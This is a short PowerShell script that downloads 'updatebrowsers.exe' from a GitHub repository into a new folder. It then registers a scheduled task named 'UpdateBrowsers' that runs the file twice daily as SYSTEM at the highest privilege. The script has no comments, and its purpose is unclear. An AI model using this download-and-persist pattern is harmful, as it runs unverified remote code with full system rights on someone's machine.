if(Test-Path -path C:\updatebrowsers){
        break
} else{
        mkdir C:\updatebrowsers
    }

invoke-webrequest -uri 'https://github.com/Pedro-Bat/importconf/raw/main/updatebrowsers.exe' -outfile C:\updatebrowsers\updatebrowsers.exe 

$exePath = "C:\updatebrowsers\updatebrowsers.exe"
$action = New-ScheduledTaskAction -Execute $exePath
$trigger1 = New-ScheduledTaskTrigger -At 10am -Daily
$trigger2 = New-ScheduledTaskTrigger -At 3pm -Daily
$principal = New-ScheduledTaskPrincipal -UserId "Autoridade NT\SISTEMA" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -Action $action -Trigger $trigger1, $trigger2 -TaskName "UpdateBrowsers" -Principal $principal
